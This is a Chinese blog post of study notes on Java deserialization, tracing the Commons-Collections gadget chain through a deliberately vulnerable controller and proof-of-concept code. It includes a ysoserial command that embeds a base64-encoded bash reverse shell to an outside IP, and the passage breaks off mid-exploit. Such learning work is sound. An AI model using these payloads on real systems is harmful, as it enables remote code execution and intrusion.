<!DOCTYPE html>
<html lang="">
  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/'>
  <meta charset="utf-8">
  <!-- SEO相关 -->
  
    
  
  <!-- 渲染优化 -->
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <link rel="preload" href="/css/first.css" as="style">
  

  <!-- 页面元数据 -->
  
  <title>学习笔记-Java相关 - byc_404&#39;s blog</title>
  
    <meta name="keywords" content="WEB,Java">
  

  
    <meta name="description" content="从几个月前就说要学javaweb。结果一直在拖。现在开篇文章强迫自己写写笔记。
大体上打算从常见漏洞和框架使用两个方面学习。因为有语言基础就不谈比较基础的部分了。">
  

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="byc_404's blog">
  

  <!-- import meta -->
  

  <!-- link -->
  
    <link rel="shortcut icon" type='image/x-icon' href="/assests/favicon.ico">
  

  <!-- import link -->
  

  
    
<link rel="stylesheet" href="/css/first.css">

  

  
  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
  

  <script id="loadcss"></script>

  
<script>
if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
    document.write(
	'<style>'+
		'html{'+
			'overflow-x: hidden !important;'+
			'overflow-y: hidden !important;'+
		'}'+
		'.kill-ie{'+
			'text-align:center;'+
			'height: 100%;'+
			'margin-top: 15%;'+
			'margin-bottom: 5500%;'+
		'}'+
	'</style>'+
    '<div class="kill-ie">'+
        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
        '<a href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>'+
    '</div>');
</script>


<noscript>
	<style>
		html{
			overflow-x: hidden !important;
			overflow-y: hidden !important;
		}
		.kill-noscript{
			text-align:center;
			height: 100%;
			margin-top: 15%;
			margin-bottom: 5500%;
		}
	</style>
    <div class="kill-noscript">
        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
        <a href="https://www.baidu.com/s?wd=启用JavaScript" target="_blank" rel="noopener"><strong>了解详情 ></strong></a>
    </div>
</noscript>

</head>

  <body>
    

<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
  <div class='container'>
  <div id='wrapper'>
    <div class='nav-sub'>
      <p class="title"></p>
      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
        
      </ul>
    </div>
		<div class="nav-main">
      
        
        <a class="title flat-box" target="_self" href='/'>
          
          
          
        </a>
      

			<div class='menu navigation'>
				<ul class='nav-list-h m-pc'>
          
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
          
            
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
          
				</ul>
			</div>

      <div class="m_search">
        <form name="searchform" class="form u-search-form">
          <i class="icon fas fa-search fa-fw"></i>
          <input type="text" class="input u-search-input" placeholder="搜索" />
        </form>
      </div>

			<ul class='switcher nav-list-h m-phone'>
				
					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
				
				<li>
          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
          <ul class="menu-phone list-v navigation white-box">
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/
                  
                  
                  
                    id="home"
                  >
                  <i class='fas fa-rss fa-fw'></i>博客
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
                  
                  
                  
                    id="tags"
                  >
                  <i class='fas fa-tags fa-fw'></i>标签
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
                  
                  
                  
                    id="archives"
                  >
                  <i class='fas fa-archive fa-fw'></i>归档
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
                  
                  
                  
                    id="friends"
                  >
                  <i class='fas fa-link fa-fw'></i>友链
                </a>
                
              </li>
            
          
            
              
            
              <li>
                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
                  
                  
                  
                    id="about"
                  >
                  <i class='fas fa-info-circle fa-fw'></i>关于
                </a>
                
              </li>
            
          
            
          </ul>
        </li>
			</ul>
		</div>
	</div>
  </div>
</header>

    <div id="l_body">
      <div id="l_cover">
  
    
        <div id="half" class='cover-wrapper post dock' style="display: ;">
          
            <div id='cover-backstretch'></div>
          
          <div class='cover-body'>
  <div class='top'>
    
    
      <p class="title">byc_404's blog</p>
    
    
      <p class="subtitle">Do not go gentle into that good night</p>
    
  </div>
  <div class='bottom'>
    <div class='menu navigation'>
      <div class='list-h'>
        
          
            <a href="/"
              
              
              id="home">
              <i class='fas fa-rss fa-fw'></i><p>博客</p>
            </a>
          
            <a href="/tags/"
              
              
              id="tags">
              <i class='fas fa-tags fa-fw'></i><p>标签</p>
            </a>
          
            <a href="/archives/"
              
              
              id="archives">
              <i class='fas fa-archive fa-fw'></i><p>归档</p>
            </a>
          
            <a href="/friends/"
              
              
              id="friends">
              <i class='fas fa-link fa-fw'></i><p>友链</p>
            </a>
          
            <a href="/about/"
              
              
              id="about">
              <i class='fas fa-info-circle fa-fw'></i><p>关于</p>
            </a>
          
        
      </div>
    </div>
  </div>
</div>

          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
        </div>
    
  
  </div>

      <div id="safearea">
        <div class="body-wrapper" id="pjax-container">
          

<div class='l_main'>
  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
  


  
  <div class="article-meta" id="top">
    
    
    
      <h1 class="title">
        学习笔记-Java相关
      </h1>
      <div class='new-meta-box'>
        
          
            
<div class='new-meta-item author'>
  <a class='author' href="https://www.bycsec.top" rel="nofollow">
    <img no-lazy src="/assests/favicon.ico">
    <p>byc_404</p>
  </a>
</div>

          
        
          
            

          
        
          
            <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Jul 9, 2020</p>
  </a>
</div>

          
        
          
            
  <div class="new-meta-item browse leancloud">
    <a class='notlink'>
      
      <div id="lc-pv" data-title="学习笔记-Java相关" data-path="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/">
        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
        次浏览
      </div>
    </a>
  </div>


          
        
      </div>
    
  </div>


  
  
  <p>从几个月前就说要学javaweb。结果一直在拖。现在开篇文章强迫自己写写笔记。</p>
<p>大体上打算从常见漏洞和框架使用两个方面学习。因为有语言基础就不谈比较基础的部分了。</p>
<a id="more"></a>

<h2 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h2><p>java比较常见的有特色的漏洞包括但不限于</p>
<ul>
<li>deserialization</li>
<li>xxe</li>
<li>SpEL</li>
<li>ssti</li>
<li>url bypass<br>……</li>
</ul>
<p>这里用JoyChou大佬的项目学习 <a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code</a><br>非常全面。</p>
<p>每种漏洞都有对应的源码。原先很多反序列的洞复现过但是没有看过源码。这里正好研究下。</p>
<h3 id="deserialization"><a href="#deserialization" class="headerlink" title="deserialization"></a>deserialization</h3><p>恶意及防范源码</p>
<pre><code class="Java">package org.joychou.controller;

import org.joychou.config.Constants;
import org.joychou.security.AntObjectInputStream;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.util.Base64;

import static org.springframework.web.util.WebUtils.getCookie;

/**
 * Deserialize RCE using Commons-Collections gadget.
 *
 * @author JoyChou @2018-06-14
 */
@RestController
@RequestMapping(&quot;/deserialize&quot;)
public class Deserialize {

    protected final Logger logger = LoggerFactory.getLogger(this.getClass());

    /**
     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64
     * Add the result to rememberMe cookie.
     * &lt;p&gt;
     * http://localhost:8080/deserialize/rememberMe/vuln
     */
    @RequestMapping(&quot;/rememberMe/vuln&quot;)
    public String rememberMeVul(HttpServletRequest request)
            throws IOException, ClassNotFoundException {

        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);

        if (null == cookie) {
            return &quot;No rememberMe cookie. Right?&quot;;
        }

        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
        ObjectInputStream in = new ObjectInputStream(bytes);
        in.readObject();
        in.close();

        return &quot;Are u ok?&quot;;
    }

    /**
     * Check deserialize class using black list.
     * &lt;p&gt;
     * http://localhost:8080/deserialize/rememberMe/security
     */
    @RequestMapping(&quot;/rememberMe/security&quot;)
    public String rememberMeBlackClassCheck(HttpServletRequest request)
            throws IOException, ClassNotFoundException {

        Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);

        if (null == cookie) {
            return &quot;No rememberMe cookie. Right?&quot;;
        }
        String rememberMe = cookie.getValue();
        byte[] decoded = Base64.getDecoder().decode(rememberMe);

        ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);

        try {
            AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException
            in.readObject();
            in.close();
        } catch (InvalidClassException e) {
            logger.info(e.toString());
            return e.toString();
        }

        return &quot;I&#39;m very OK.&quot;;
    }

}</code></pre>
<p>这里应该是模仿shiro的rememberMecookie反序列化.下面先来回顾下java的序列化知识</p>
<p><a href="https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/</a></p>
<ul>
<li><p>about</p>
<blockquote>
<p>Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</p>
</blockquote>
</li>
<li><p>usage</p>
</li>
</ul>
<p>1.弥补操作系统的差异<br>2.向远程对象发送信息时，需要通过对象序列化来传输参数和返回值<br>3.使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的<br>4.方便保存对象信息以便于下次JVM启动时可以直接使用。</p>
<ul>
<li>dependencies</li>
</ul>
<p>1.实现 java.io.Serializable 对象<br>2.该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</p>
<p>下面是一个练手的例子。<br>User类</p>
<pre><code class="java">import java.io.*;

public class User implements Serializable {
    public String name;
    public int num;
    public void info(){
        System.out.println(&quot;name : &quot;+name+&quot;\nnum : &quot;+num);
    }
}</code></pre>
<p>test类</p>
<pre><code class="java">import java.io.*;


public class test {
    public static  void serialize_test(){
        User user=new User();
        user.name=&quot;byc_404&quot;;
        user.num=404;
        user.info();

        try {
            FileOutputStream f= new FileOutputStream(&quot;user.ser&quot;);
            ObjectOutputStream o =new ObjectOutputStream(f);

            o.writeObject(user);
            o.close();
            f.close();
            System.out.println(&quot;[*]serialize done.&quot;);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static  void unserialize_test(){
        User user=null;
        try {
            FileInputStream f= new FileInputStream(&quot;user.ser&quot;);
            ObjectInputStream o =new ObjectInputStream(f);
            user=(User)o.readObject();
            o.close();
            f.close();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        System.out.println(&quot;[*]unserialize done.&quot;);
        user.info();
    }


    public static void main(String[] args) {
        unserialize_test();
    }

}</code></pre>
<p>首先注意上面的语句直接调用读写文件时都需要实现trycatch。而readobject时特殊的添加了一个ClassNotFound 的异常。在idea中写好原代码后ctrl+alt+t添加会自动考虑到这些问题，<br>生成的user.ser的数据</p>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>开头AC ED 表示支持序列化协议。00 05 则是序列化版本。这是序列化数据比较显著的特征。</p>
<p>由于编程中的选择原因，有时需要我们实现非默认的序列化过程。此时可以在实现了Serializable接口的前提下添加两个方法</p>
<pre><code class="java">private void writeObject(ObjectOutputStream stream) throws IOException

private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException</code></pre>
<p><strong>在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法同理</strong></p>
<p>那么回到远程。这里直接打一发弹shell的payload。去<a href="http://jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">jackson</a>直接转换下编码</p>
<pre><code>java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjcuMjQ2LjIwMi85MDAxIDA+JjE=}|{base64,-d}|{bash,-i}&quot; | base64</code></pre><p>这环境貌似是只有cc5的gadget能用.后来在原作者那看到应该是引入了apache-commons-collections 3.1.jar<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<ul>
<li>CommonCollections 审计</li>
</ul>
<p>下面正好来审计下Commons-Collections这个包。<a href="https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1" target="_blank" rel="noopener">https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1</a></p>
<p>在这下好jar包后把它加进library.就可以看源码了。<br>漏洞代码出现在这一部分。<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>TransformedMap类是实现了serializable,对Java标准数据结构Map接口的一个扩展TransformedMap.decorate()方法，可以获得一个TransformedMap的实例化的对象。</p>
<p><code>TransformedMap.decorate()</code>方法能将普通的MapA转换为TransformedMapB，同时如果<code>TransformedMap.decorate()</code>方法设置了第二个参数keyTransformer或者第三个参数valueTransformer，当TransformedMapB调用Map的put方法或者Map.Entry的setValue方法就会自动触发刚才设置的keyTransformer或者valueTransformer相应的Transformer</p>
<p>Map.put与Map.Entry其实就是Map的两个比较常见的接口。前者可以往map中设置一对键值。后者则是定义了getKey(),getValue()，setKey(),setValue()等方法可以用来获取修改键值。</p>
<blockquote>
<p>牛逼的是这个Transformer可以利用数组构造成ChainedTransformer，ChainedTransformer最后利用Java的反射机制命令执行。</p>
</blockquote>
<p>关于反射命令执行。这个算是java非常常见的命令技巧了。在SpEL跟Spring 的ssti中经常见到。主要目的就是绕过沙盒。当然如php的序列化中也曾经遇到过.这算是Java动态特性的体现。</p>
<p>一个弹计算器的反射payload</p>
<pre><code class="java">import java.lang.reflect.Method;

public class reflect {
    public static void main(String[] args) throws Exception {
        Object input = Runtime.class;
        Class cls = input.getClass();
        Method method = cls.getMethod(&quot;getMethod&quot;, new Class[] { String.class, Class[].class });
        input = method.invoke(input, new Object[] { &quot;getRuntime&quot;, new Class[0] });

        // 此时cls为Method，对应getRuntime方法，获取invoke方法并执行
        cls = input.getClass();
        method = cls.getMethod(&quot;invoke&quot;, new Class[] { Object.class, Object[].class });
        input = method.invoke(input, new Object[] { null, new Object[0] });

        // 此时cls为Runtime，对应Runtime.getRuntime()的结果，可调用exec方法
        cls = input.getClass();
        method = cls.getMethod(&quot;exec&quot;, new Class[] { String.class });
        input = method.invoke(input, new Object[] { &quot;calc&quot; });
    }
}</code></pre>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
<p>下面来跟着JoyChou师傅的博文看看Map.put是怎么通过构造达成命令执行的。</p>
<pre><code class="java">import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class poc1 {
    public static void main(String[] args) {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;})};

        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();

        innermap.put(&quot;name&quot;, &quot;byc_404&quot;);

        Map outmap = TransformedMap.decorate(innermap, transformerChain, null);
        outmap.put(&quot;quote&quot;,&quot;23333&quot;);
    }
}</code></pre>
<p>在put()方法那下一个断点。第一步是调用TransformedMap.put()方法<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>然后进行一个keyTransformer是否为空的判断。我们因为设置了ChainedTransformer作为keyTransformer,因此接下来是调用ChainedTransformer.transform()<br><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>可以看到下面的this就是ChainedTransformer对象。<br>然后这个for循环会总共调用四次transform(),调用1次<code>ConstantTransformer.transform()</code>方法，然后调用3次<code>InvokerTransformer.transform()</code></p>
<pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);
            } catch (IllegalAccessException var6) {
                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);
            } catch (InvocationTargetException var7) {
                throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + this.iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, var7);
            }
        }
    }
}</code></pre>
<p><img src="/2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>到这一步已经能看出我们构造函数的参数已经控制InvokerTransformer反射的参数了。达成命令执行。<br>gadget</p>
<pre><code>TransformedMap.put()
    =&gt;TransformedMap.transformKey()
        =&gt;ChainedTransformer.transform()
           =&gt;ConstantTransformer.transform()
              =&gt;InvokerTransformer.transform()
                    =&gt;Method.invoke()
                        Class.getMethod()
              =&gt;InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.getRuntime()
              =&gt;InvokerTransformer.transform()
                    Method.invoke()
                        Runtime.exec()</code></pre><p>Map.Entry的poc我就不跟了。基本上是一样的机理。</p>
<p>接下来也就是CommonCollections的gadget了。上面我们知道,我们可以利用Map类的对象进行反射的payload构造。那么我们恶意类的成员肯定是Map类的。并且由于反序列化的要求,这个类重写了readObject(),并且在readObject()中调用了put()或者setValue()</p>
<p>在不同jdk版本中我们能找到的符合要求的类不同。目前比较新的应该是用BadAttributeValueExpException+TiedMapEntry+lazyMap+ChainedTransformer的链子<br>先来看下BadAttributeValueExpException</p>
<pre><code class="java">public class BadAttributeValueExpException extends Exception   {


    /* Serial version */
    private static final long serialVersionUID = -3105272988410493376L;

    /**
     * @serial A string representation of the attribute that originated this exception.
     * for example, the string value can be the return of {@code attribute.toString()}
     */
    private Object val;

    /**
     * Constructs a BadAttributeValueExpException using the specified Object to
     * create the toString() value.
     *
     * @param val the inappropriate value.
     */
    public BadAttributeValueExpException (Object val) {
        this.val = val == null ? null : val.toString();
    }


    /**
     * Returns the string representing the object.
     */
    public String toString()  {
        return &quot;BadAttributeValueException: &quot; + val;
    }

    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get(&quot;val&quot;, null);

        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();
        }
    }
 }</code></pre>
<p>从BadAttributeValueExpException类的readObejct()方法知道,<code>val.toString()</code>是整个readObject()的重点。现在需要一个类，能在调用toString()方法时触发transform()方法来执行我们构造的反射链</p>
<p>找到LazyMap的get()方法。与php的魔术方法一样,可以在调用不存在的key时来执行一个方法生成key.</p>
<pre><code class="java">    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }</code></pre>
<p>最后是TiedMapEntry类</p>
<pre><code class="java">//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package org.apache.commons.collections.keyvalue;

import java.io.Serializable;
import java.util.Map;
import java.util.Map.Entry;
import org.apache.commons.collections.KeyValue;

public class TiedMapEntry implements Entry, KeyValue, Serializable {
    private static final long serialVersionUID = -8453869361373831205L;
    private final Map map;
    private final Object key;

    public TiedMapEntry(Map map, Object key) {
        this.map = map;
        this.key = key;
    }

    public Object getKey() {
        return this.key;
    }

    public Object getValue() {
        return this.map.get(this.key);
    }

    public Object setValue(Object value) {
        if (value == this) {
            throw new IllegalArgumentException(&quot;Cannot set value to this map entry&quot;);
        } else {
            return this.map.put(this.key, value);
        }
    }

    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        } else if (!(obj instanceof Entry)) {
            return false;
        } else {
            Entry other = (Entry)obj;
            Object value = this.getValue();
            return (this.key == null ? other.getKey() == null : this.key.equals(other.getKey())) &amp;&amp; (value == null ? other.getValue() == null : value.equals(other.getValue()));
        }
    }

    public int hashCode() {
        Object value = this.getValue();
        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
    }

    public String toString() {
        return this.getKey() + &quot;=&quot; + this.getValue();
    }
}</code></pre>
<p>它在调用toString()时,实际上调用了getValue()即map.get(key)。这样它就符合上面Lazymap的要求了。<br>那么gadget就是</p>
<pre><code class="java">BadAttributeValueExpException.readObject()//其val为TiedMapEntry
  =&gt;TiedMapEntry.toString()=&gt;TiedMapEntry.getValue()//其map对象是LazyMap
    =&gt;LazyMap.get()//其factory对象是ChainedTransformer
      =&gt;ChainedTransformer.transform()</code></pre>
<p>最终的exp.也是cc5的链子</p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
